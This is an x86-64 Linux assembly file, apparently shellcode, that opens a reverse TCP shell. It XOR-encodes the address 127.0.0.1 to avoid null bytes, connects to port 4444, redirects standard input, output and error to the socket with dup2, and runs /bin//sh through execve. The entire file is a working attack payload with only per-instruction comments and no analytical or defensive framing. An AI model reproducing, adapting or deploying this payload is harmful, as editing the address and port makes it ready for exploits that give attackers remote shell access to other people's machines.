global _start

_start:
    xor     rax, rax
    xor     rdi, rdi
    xor     rsi, rsi
    xor     rdx, rdx
    
    mov     edx, 4278189952             ; 0xfeffff80 = 0x0100007f ^ 0xffffffff
    xor     edx, 0xffffffff             ; edx = 0x0100007f
    
    ;; struct sockaddr
    push    rax                         ; padding
    push    rdx                         ; pton(0x7f000001) = 0x0100007f
    push    word 0x5c11                 ; htons(4444)
    push    word 2                      ; AF_INET
    
    ;; socket()
    mov     dil, 2                      ; AF_INET
    mov     sil, 1                      ; SOCK_STREAM
    xor     rdx, rdx                    ; IPPROTO_IP
    mov     al, 41                      ; socket syscall
    syscall
       
    ;; connect()
    mov     rdi, rax                    ; sock_fd
    mov     rsi, rsp                    ; sockaddr
    mov     dl, 24                      ; sizeof
    xor     rax, rax
    mov     al, 42                      ; connect syscall
    syscall
    
    xor     r8, r8                      ; counter
    ;; dup2()
dup:
    mov     rsi, r8                     ; counter
    mov     al, 33                      ; dup2 syscall
    syscall
    inc     r8                          ; ++counter
    cmp     r8, 3
    jne     dup                         ; counter != 3
    
    ;; execve()
    xor     rdx, rdx                    ; NULL
    xor     rsi, rsi                    ; NULL
    push    rsi                         ; \x00
    mov     rax, 0x68732f2f6e69622f     ; /bin//sh
    push    rax
    mov     rdi, rsp
    xor     rax, rax
    mov     al, 59                      ; execve syscall
    syscall
